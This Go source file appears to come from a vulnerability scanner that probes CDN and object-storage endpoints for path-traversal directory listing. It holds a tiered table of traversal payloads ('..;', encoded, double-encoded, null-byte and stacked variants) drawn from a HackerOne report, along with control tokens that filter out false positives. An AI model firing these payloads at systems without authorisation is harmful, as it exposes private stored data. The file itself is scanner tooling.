package cdn_object_traversal_listing

import "strings"

// travToken is one parent-collapse payload appended as a trailing segment to a
// real object path. tier 1 = always probed (the report-documented set);
// tier 2 = encoding/mangle/null/stacked variants, probed only after tier 1
// shows a distinct (non-baseline, non-wildcard) response.
type travToken struct {
	tok  string
	tier int
}

// travTokens is the curated payload table. Tier 1 mirrors the three payloads in
// HackerOne #3523931 (..;, %2e%2e%3b, double-encoded) plus the trailing-slash
// form. Tier 2 layers on the encoding/transformation matrix from the directory
// traversal cheat sheet, restricted to forms that plausibly collapse to the
// parent on an object-storage parser.
var travTokens = []travToken{
	// --- Tier 1: documented ---
	{"..;", 1},
	{"%2e%2e%3b", 1},
	{"%252e%252e%253b", 1},
	{"..;/", 1},

	// --- Tier 2: mixed and encoded semicolon ---
	{"..%3b", 2},
	{"%2e%2e;", 2},
	{"..;a=b/", 2}, // named matrix parameter
	{"..%3b%2f", 2},
	{"%2e%2e%3b%2f", 2},
	// --- Tier 2: mangle (non-recursive strip survival) and null truncation ---
	{"....;//", 2},
	{"..;%00", 2},
	{"%2e%2e%3b%00", 2},
	// --- Tier 2: stacked depth for objects nested under a prefix ---
	{"..;/..;/", 2},
	{"%2e%2e%3b/%2e%2e%3b/", 2},
	{"..;/..;/..;/", 2},
}

// controlTokens are non-collapsing suffixes that share the trailing
// matrix-parameter shape but cannot resolve to the parent (the dots are
// replaced by inert characters). If the endpoint returns a listing for these,
// the listing is a catch-all rather than a traversal — reject the candidate.
var controlTokens = []string{
	"zz;",
	"vigolium-not-trav;",
	"zzzz;/",
}

func tierTokens(pass int) []travToken {
	var out []travToken
	for _, t := range travTokens {
		if t.tier == pass {
			out = append(out, t)
		}
	}
	return out
}

// joinProbe appends a trailing payload segment to a cleaned object path.
func joinProbe(objPath, tok string) string {
	return strings.TrimRight(objPath, "/") + "/" + tok
}
